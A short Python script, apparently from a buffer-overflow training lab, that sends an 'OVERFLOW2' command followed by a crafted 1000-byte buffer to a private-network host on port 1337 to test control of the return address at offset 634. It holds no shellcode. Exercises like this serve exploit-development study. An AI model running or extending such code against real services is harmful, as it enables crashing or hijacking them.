import socket

OFFSET=634
NO_B=4
NO_C=4
NO_Z=8
RHOST="192.168.180.140"
RPORT=1337

def connect(DATA):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((RHOST, RPORT))
        s.send(("OVERFLOW2 " + DATA + "\r\n"))
        s.close()
        print ("Sent: {}".format(DATA))

BUFT = 1000

buf = ""
buf += "A"*(OFFSET - len(buf))
buf += "B"*NO_B
buf += "Z"*NO_Z
buf += "C"*NO_C
buf += "D"*(BUFT - len(buf))

connect(buf)

